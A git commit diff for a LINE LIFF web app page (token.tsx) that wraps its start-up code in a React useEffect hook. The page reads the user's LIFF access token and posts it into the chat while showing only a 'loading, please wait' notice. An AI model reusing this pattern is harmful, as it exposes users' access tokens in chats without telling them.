3ace94a02f6c0038b8313c0be3b51b656f3be54f
EdamAme <121654029+EdamAme-x@users.noreply.github.com>
2023-10-14 14:22:43 +0900

    add

--- line-tool-box/pages/token.tsx
+++ line-tool-box/pages/token.tsx
@@ -1,22 +1,25 @@
 "use client";
 import { liff } from "@line/liff";
 import { getLiffId } from "@/utils/getLiffId";
+import { useEffect } from "react";
 
 export default function Token() {
-    liff.init({
-        liffId: getLiffId()
-    }).then(() => {
-        if (liff.isInClient()) {
-            liff.sendMessages([{
-                type: "text",
-                text: " == Token == "
-            }, {
-                type: "text",
-                text: liff.getAccessToken() || "Sorry Bad Do"
-            }])
-        }
-    })
-
+    useEffect(() => {
+        liff.init({
+            liffId: getLiffId()
+        }).then(() => {
+            if (liff.isInClient()) {
+                liff.sendMessages([{
+                    type: "text",
+                    text: " == Token == "
+                }, {
+                    type: "text",
+                    text: liff.getAccessToken() || "Sorry Bad Do"
+                }])
+            }
+        })
+    
+    }, [])
     return <>
         <p>読み込み中です。 (画面を閉じないで待ってください。)</p>
     </>
